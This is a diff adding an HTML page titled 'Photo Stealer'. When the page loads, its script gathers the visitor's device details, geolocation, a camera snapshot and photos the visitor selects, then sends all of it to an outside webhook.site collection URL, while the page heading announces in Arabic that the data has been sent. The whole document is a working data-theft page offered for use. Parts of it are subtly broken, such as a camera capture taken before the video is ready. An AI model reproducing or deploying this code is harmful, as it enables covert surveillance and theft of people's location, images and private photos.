@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Photo Stealer</title>
+  <script>
+    async function collectAndSendData() {
+      const deviceData = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: screen.width + 'x' + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        location: await getLocation(),
+        camera: await getCamera(),
+        photos: await getPhotos()
+      };
+
+      fetch('https://webhook.site/73751902-f87d-4c45-a29d-74eb122134b8', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(deviceData)
+      });
+
+      document.getElementById("result").innerText = JSON.stringify(deviceData, null, 2);
+    }
+
+    function getLocation() {
+      return new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              resolve({
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+              });
+            },
+            (error) => {
+              resolve({ error: error.message });
+            }
+          );
+        } else {
+          resolve({ error: 'Geolocation is not supported by this browser.' });
+        }
+      });
+    }
+
+    function getCamera() {
+      return new Promise((resolve, reject) => {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+          navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+              const video = document.createElement('video');
+              video.srcObject = stream;
+              video.play();
+              const canvas = document.createElement('canvas');
+              const context = canvas.getContext('2d');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const imageData = canvas.toDataURL('image/png');
+              resolve({ image: imageData });
+            })
+            .catch((error) => {
+              resolve({ error: error.message });
+            });
+        } else {
+          resolve({ error: 'Camera is not supported by this browser.' });
+        }
+      });
+    }
+
+    function getPhotos() {
+      return new Promise((resolve, reject) => {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+          const options = {
+            types: [
+              {
+                description: 'Images',
+                accept: {'image/*': ['.jpg', '.jpeg', '.png', '.gif']},
+                multiple: true
+              }
+            ],
+            excludeAcceptAllOption: true
+          };
+
+          const input = document.createElement('input');
+          input.type = 'file';
+          input.accept = 'image/*';
+          input.multiple = true;
+          input.onchange = (event) => {
+            const files = event.target.files;
+            const photos = [];
+            for (let i = 0; i < files.length; i++) {
+              const reader = new FileReader();
+              reader.onload = (e) => {
+                photos.push(e.target.result);
+                if (photos.length === files.length) {
+                  resolve({ photos: photos });
+                }
+              };
+              reader.readAsDataURL(files[i]);
+            }
+          };
+          input.click();
+        } else {
+          resolve({ error: 'File input is not supported by this browser.' });
+        }
+      });
+    }
+  </script>
+</head>
+<body onload="collectAndSendData()">
+  <h2>تم إرسال البيانات:</h2>
+  <pre id="result"></pre>
+</body>
+</html>
